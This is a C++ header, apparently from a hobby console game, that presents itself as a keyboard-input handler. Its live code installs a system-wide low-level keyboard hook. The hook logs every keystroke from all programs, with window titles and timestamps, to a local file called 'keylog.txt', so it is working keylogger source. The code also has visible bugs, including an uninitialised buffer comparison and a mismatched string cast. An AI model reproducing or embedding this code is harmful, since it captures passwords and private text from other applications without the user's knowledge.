#pragma once
//#include <thread>
//#include <conio.h>
//#include <iostream>
//
//
//void key_handler_function(bool& exit_game) {
//	std::cout << "key_handler_t" << "\n";
//	char c;
//	while (!exit_game)
//	{
//		if (_kbhit())
//		{
//			c = _getch();
//			std::cout << c << "\n";
//
//		}
//	}
//}
//
//class KeyHandling
//{
//public:
//	KeyHandling(){
//		std::thread key_handler_t(key_handler_function, std::ref(exit_game_key_handler));
//		//key_handler_t.join();
//		key_handler_t.detach();
//		assert(!key_handler_t.joinable());
//
//	};
//	~KeyHandling(){};
//
//	
//
//public:
//	bool exit_game_key_handler = false;
//};

#include <Windows.h>
#include <iostream>
#include <thread>
#include <time.h>
#include <fstream>

#pragma warning(disable:4996)
#pragma warning(disable:4703)

int Save(int key);

LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam);

HHOOK hook;

KBDLLHOOKSTRUCT kbStruct;

std::ofstream file;

char current_key = '№';

int Save(int key) {

	char prevProg[256];

	if (key == 1 || key == 2)
	{
		return 0;
	}

	HWND foreground = GetForegroundWindow();

	DWORD threadId;

	HKL keyboardLayout;

	if (foreground)
	{
		threadId = GetWindowThreadProcessId(foreground, NULL);
		keyboardLayout = GetKeyboardLayout(threadId);
		char crrProg[256];
		GetWindowText(foreground, (LPWSTR)crrProg, 256);
		if (strcmp(crrProg, prevProg) != 0)
		{
			strcpy_s(prevProg, crrProg);
			time_t t = time(NULL);
			struct tm *tm = localtime(&t);
			char c[64];
			strftime(c, sizeof(c), "%c", tm);
			file << "\n\n\n[Program:" << crrProg << " DataTime: " << c << "]";
		}
		
	}

	
	if (key == VK_BACK)
		file << "BACKSPACE";
	else if (key == VK_RETURN)
		file << "\n";
	else if (key == VK_SPACE)
		file << " ";
	else if (key == VK_TAB)
		file << "[TAB]";
	else if (key == VK_SHIFT || key == VK_LSHIFT || key == VK_RSHIFT)
		file << "[SHIFT]";
	else if (key == VK_CONTROL || key == VK_LCONTROL || key == VK_RCONTROL)
		file << "[CTRL]";
	else if (key == VK_ESCAPE)
		file << "[ESC]";
	else if (key == VK_END)
		file << "[END]";
	else if (key == VK_HOME)
		file << "[HOME]";
	else if (key == VK_LEFT)
		file << "[LEFT]";
	else if (key == VK_RIGHT)
		file << "[RIGHT]";
	else if (key == VK_UP)
		file << "[UP]";
	else if (key == VK_DOWN)
		file << "[DOWN]";
	else if (key == 190 || key == 110)
		file << ".";
	else if (key == 189 || key == 109)
		file << "-";
	else if (key == 20)
		file << "[CAPS]";
	else
	{
		char crrKey;

		bool lower = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);
		if ((GetKeyState(VK_SHIFT) & 0x1000) != 0 ||
			(GetKeyState(VK_LSHIFT) & 0x1000) != 0 ||
			(GetKeyState(VK_RSHIFT) & 0x1000) != 0 )
		{
			lower = !lower;
		}

		crrKey = MapVirtualKeyExA(key, MAPVK_VK_TO_CHAR, keyboardLayout);

		if (!lower)
		{
			crrKey = tolower(crrKey);
		}

		//std::cout << char(crrKey) << "\n";
		file << char(crrKey);
		current_key = char(crrKey);
	}

	file.flush();

	return 0;
}

LRESULT __stdcall HookCallBack(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode >= 0)
	{
		if (wParam == WM_KEYDOWN)
		{
			kbStruct = *((KBDLLHOOKSTRUCT*)lParam);

			Save(kbStruct.vkCode);

		}
	}


	return CallNextHookEx(hook, nCode, wParam, lParam);
}

void key_handler_function(bool& exit_game) {

	file.open("keylog.txt", std::ios_base::app);
	ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 1);

	if (!(hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallBack, NULL, 0)))
	{
		MessageBox(NULL, L"Something has gone wrong", L"Error", MB_ICONERROR);
	}

	MSG message;
	while (!exit_game)
	{
		GetMessage(&message, NULL, 0, 0);
	}
}



class KeyHandling
{
public:
	KeyHandling(){
		std::thread key_handler_t(key_handler_function, std::ref(exit_game_key_handler));
		
		key_handler_t.detach();
		assert(!key_handler_t.joinable());

	};
	~KeyHandling(){};

	bool key(char& res) {
		if (current_key != '№')
		{
			res = current_key;
			current_key = '№';
			return 1;
		}
		else
		{
			return 0;
		}
	}

public:
	bool exit_game_key_handler = false;
};